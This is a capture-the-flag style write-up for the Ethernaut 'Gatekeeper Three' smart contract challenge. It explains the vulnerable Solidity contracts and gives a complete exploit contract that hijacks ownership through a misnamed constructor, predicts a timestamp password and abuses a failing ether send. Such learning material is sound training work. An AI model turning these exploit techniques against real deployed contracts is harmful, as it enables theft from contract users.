# Writeup for Gatekeeper Three

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

Cope with gates and become an entrant.

Things that might help:

- Recall return values of low-level functions.
- Be attentive with semantic.
- Refresh how storage works in Ethereum.

### Contract Explaination

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

Click [here](./src/contracts/GatekeeperThree.sol) to view the contract source code.

<details>
<summary>Click to view the contract explanation</summary>

First i will explain the `SimpleTrick` contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}
```

The `SimpleTrick` contract has three state variables named `target`, `trick`, and `password`. The `target` is of type `GatekeeperThree` (address), `trick` is of type **address**, and `password` is of type **uint256** and is initialized to `block.timestamp`.

```solidity
constructor(address payable _target) {
    target = GatekeeperThree(_target);
}

```

The `constructor` takes an address of payable type as input and initializes the `target` with a `GatekeeperThree` instance of the address passed.

```solidity
function checkPassword(uint256 _password) public returns (bool) {
    if (_password == password) {
        return true;
    }
    password = block.timestamp;
    return false;
}

```

The function `checkPassword()` takes an argument of type **uint256** (\_password) as input and compares the \_password passed with the `password` stored in the contract. If both match, it will return `true`. If not, it will set the password to `block.timestamp` and return `false`.

```solidity

function trickInit() public {
    trick = address(this);
}
```

The `trickInit()` function sets the `trick` variable to `address(this)` (the contract address of the `SimpleTrick` contract).

```solidity
function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
        target.getAllowance(password);
    }
}
```

The function `trickyTrick()` is a public function. It checks if the `msg.sender` (caller) is the `SimpleTrick` contract and if `trick` is not the `SimpleTrick` contract address. If both conditions are satisfied, it will call the `getAllowance()` function in the `GatekeeperThree` contract by passing the `password` as an argument.

Now i will explain the `GatekeeperThree` contract.

```solidity
contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

The contract has 4 state variables named owner, entrant, allowEntrance, trick.

```solidity
function construct0r() public {
        owner = msg.sender;
    }
```

The `construct0r()` function sets the `owner` to `msg.sender` (the caller or deployer of the contract).

```solidity
modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}
```

The modifier `gateOne` will check if `msg.sender` (caller) is the `owner`. If the caller is not the `owner`, it will revert. It also checks whether `tx.origin` (transaction initiator EOA) is the `owner` or not. If `tx.origin` is the `owner`, it will revert.

```solidity
modifier gateTwo() {
    require(allowEntrance == true);
    _;
}
```

```solidity
modifier gateTwo() {
    require(allowEntrance == true);
    _;
}
```

The modifier gateTwo will check if the allowEntrance is true or not. If it is not true then it will revert.

```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```

The modifier `gateThree` will check if the balance of the `GatekeeperThree` contract is greater than 0.001 ether and if the return value of the `send()` function is false. If the `send()` function returns true or the contract balance is less than 0.001 ether, the function implementing this modifier will not execute.

One important thing to observe here is that even if the condition fails, the function call won't revert because the modifier is not reverting. So, if the condition in the modifier fails, it won't revert the function, but it also won't execute the function because `_` is inside the `if` condition. The function will be executed only if the the modifier execution reaches the `_;` .

```solidity

function getAllowance(uint256 _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
}
```

The `getAllowance()` function takes an argument of type **uint256** (\_password) as input and calls the `checkPassword() `function in the `SimpleTrick` contract. If the `checkPassword()` function returns true, then it sets `allowEntrance` to true.

```solidity
function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
}

```

The `createTrick()` function creates a new instance of the `SimpleTrick` contract and assigns the instance to the variable `trick`. Then it calls the `trickInit()` function in the `SimpleTrick` contract.

```solidity
function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
}
```

The function `enter()` is a public function that executes the modifiers `gateOne`, `gateTwo`, and `gateThree`. If all the modifiers pass, then it sets the `entrant` to `tx.origin` (initiator of the transaction).

```solidity
receive() external payable {}
```

The contract has a `receive()` function. When someone interacts with this contract by sending some data that doesn't match any function selector, the `receive()` function will be called. It will also be called if someone sends ether to the contract without calling any function.

</details>

### Exploit

Our goal is to become the entrant. The only way we can become the entrant is by calling the enter() function. In order to become the entrant we need to pass the three modifiers. So let's try to pass each modifier one by one. We was given the instance of GatekeeperThree contract.

```solidity
modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}

```

This modifier can be passed by setting up our Exploit contract address as the owner and then interacting with the `enter()` function from the Exploit contract. If we do that, `msg.sender` will be our Exploit contract address and `owner` will also be our Exploit contract address. Then `tx.origin` will be our wallet address since we are calling the function in our Exploit contract and that function is calling the `enter()` function. So the `tx.origin` (EOA) won't be equal to the Exploit contract address.

We set up our `Exploit` contract address as owner by calling the `construct0r()` function in `GatekeeperThree` contract.

Now lets pass the Second Gate.

```solidity
modifier gateTwo() {
    require(allowEntrance == true);
    _;
}
```

The modifier `gateTwo` can be passed by setting the `allowEntrance` variable to `true`. The `allowEntrance` value depends on the `getAllowance()` function. If we pass the password to `getAllowance()`, it calls the `checkPassword()` function in the `SimpleTrick` contract and checks if the password is correct. If it is correct, it will return `true`.

If we see the `checkPassword()` function in the `SimpleTrick` contract, it compares the `_password` passed as an argument with the `password` stored in the state variable. If both match, it will return `true`. So, in order to know the correct password, we need to check the value at slot 2 in the `SimpleTrick` contract because the password is stored in slot 2. In order to check the value at slot 2, we need the contract address of the SimpleTrick contract. They didn't give the address of the SimpleTrick contract. They gave us the instance of the GatekeeperThree contract.

In the GatekeeperThree contract, the 4th state variable is the address of the SimpleTrick contract. From that, we can know the address of the SimpleTrick contract. So now it's time to open the console.

```javascript
await contract.trick();
```

It will return `0x0000000000000000000000000000000000000000`, which means the SimpleTrick contract is not deployed. However, if we look at the `createTrick()` function, it will create an instance of the SimpleTrick contract and assign it to trick. We are the ones calling the `createTrick()` function and making the instance of the SimpleTrick contract. Instead of calling the `createTrick()` function in the console, if we call it from our Exploit contract, it will be easier for us to get the password because the password is set to `block.timestamp` in SimpleTrick contract. Since we are calling `createTrick()` from our Exploit contract, we can call it from a function in the Exploit contract and within that function, we can call the `getAllowance()` function and directly pass `block.timestamp` to it, which will allow us to pass the second gate successfully.

Till here how Exploit contract will look like the following.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperThree{
    function enter() external;
    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function createTrick() external;
}

contract ExploitGateKeeperThree{
    IGateKeeperThree gateKeeperThree;

    constructor(address _addr){
        gateKeeperThree=IGateKeeperThree(_addr);
    }

    function Exploit()public payable{
        gateKeeperThree.construct0r();
        gateKeeperThree.createTrick();
        gateKeeperThree.getAllowance(block.timestamp);
        gateKeeperThree.enter();

    }
}
```

Now we also need to pass modifier three. So we need make some more calls in the Exploit() function before the enter() function.

```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```

The modifier `gateThree()` will check if the contract has a balance greater than 0.001 ether. So, we need to send the `GatekeeperThree` contract some ether, more than 0.001 ether. Another condition it checks is when it tries to send some ether to the `owner` (Exploit contract), it expects the transaction to return false, which means the transaction should fail. If our Exploit contract doesn't have the `receive()` function, then this condition will be satisfied.

So now, in our `Exploit()` function, before calling `enter()`, we need to send ether greater than `0.001 ether`to the `GatekeeperThree` contract. Below is the final `Exploit` contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperThree{
    function enter() external;
    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function createTrick() external;
}


contract ExploitGateKeeperThree{
    IGateKeeperThree gateKeeperThree;

    constructor(address _addr){
        gateKeeperThree=IGateKeeperThree(_addr);

    }

    function Exploit()public payable{
        gateKeeperThree.construct0r();
        gateKeeperThree.createTrick();
        gateKeeperThree.getAllowance(block.timestamp);
        address(gateKeeperThree).call{value:1000000000000001}("");
        gateKeeperThree.enter();
    }
}

```

Once you deploy this Exploit contract and call Exploit() function the challenge will be solved. Hope you enjoyed this challenge.

### Key takeaways

When someone is sending ether to a contract and if the contract doesn't have a receive() function, the transaction will fail.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
